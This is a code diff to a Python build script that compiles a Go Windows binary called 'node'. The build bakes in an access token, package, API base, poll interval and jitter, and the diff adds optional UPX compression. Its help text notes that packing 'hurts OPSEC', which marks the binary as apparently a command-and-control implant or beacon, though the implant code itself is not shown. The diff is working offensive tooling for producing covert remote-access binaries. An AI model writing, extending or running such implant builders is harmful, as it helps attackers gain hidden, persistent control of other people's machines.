@@ -54,8 +54,23 @@ def make_resources(arch_key):
     shutil.copy2(syso, os.path.join(GO_DIR, cfg["syso"]))
 
 
+def pack_upx(path):
+    """Compress the PE with UPX. Returns (before, after) or None if absent."""
+    upx = shutil.which("upx")
+    if upx is None:
+        return None
+    before = os.path.getsize(path)
+    p = subprocess.run([upx, "--best", "--lzma", "-q", path],
+                       capture_output=True, text=True)
+    if p.returncode != 0:
+        sys.stderr.write(f"[!] upx failed: {p.stderr[-400:]}\n")
+        return None
+    return before, os.path.getsize(path)
+
+
 def build(token=None, package=None, api_base=None, arch_key="amd64",
-          outdir=None, name="node", strip=True, interval=60, jitter=20):
+          outdir=None, name="node", strip=True, interval=60, jitter=20,
+          upx=False):
     if token and not package:
         raise SystemExit("--package is required with --token")
 
@@ -97,7 +112,16 @@ def build(token=None, package=None, api_base=None, arch_key="amd64",
         raise SystemExit("go build failed")
     if not os.path.exists(target):
         raise SystemExit(f"go build reported success but {target} is missing")
-    log(f"[+] {target} ({os.path.getsize(target):,} bytes)")
+    size = os.path.getsize(target)
+    if upx:
+        packed = pack_upx(target)
+        if packed:
+            before, after = packed
+            log(f"[+] upx: {before:,} -> {after:,} bytes ({after / before * 100:.1f}%)")
+        else:
+            log("[!] upx not found: leaving the binary unpacked")
+    final = os.path.getsize(target)
+    log(f"[+] {target} ({final:,} bytes)")
     return target
 
 
@@ -112,16 +136,19 @@ def main():
                     help="poll interval baked into the binary (default 60)")
     ap.add_argument("--jitter", type=int, default=20,
                     help="jitter baked into the binary (default 20)")
+    ap.add_argument("--upx", action="store_true",
+                    help="compress with UPX (~31%% of the size; hurts OPSEC)")
     ap.add_argument("--32", dest="x86", action="store_true", help="also build 386")
     ap.add_argument("--no-strip", action="store_true")
     a = ap.parse_args()
     if not a.package:
         raise SystemExit("--package/-p is required: the binary carries it")
     build(a.token, a.package, a.api_base, "amd64", a.outdir, a.name,
-          strip=not a.no_strip, interval=a.interval, jitter=a.jitter)
+          strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx)
     if a.x86:
         build(a.token, a.package, a.api_base, "386", a.outdir, a.name,
-              strip=not a.no_strip, interval=a.interval, jitter=a.jitter)
+              strip=not a.no_strip, interval=a.interval, jitter=a.jitter,
+              upx=a.upx)
 
 
 if __name__ == "__main__":
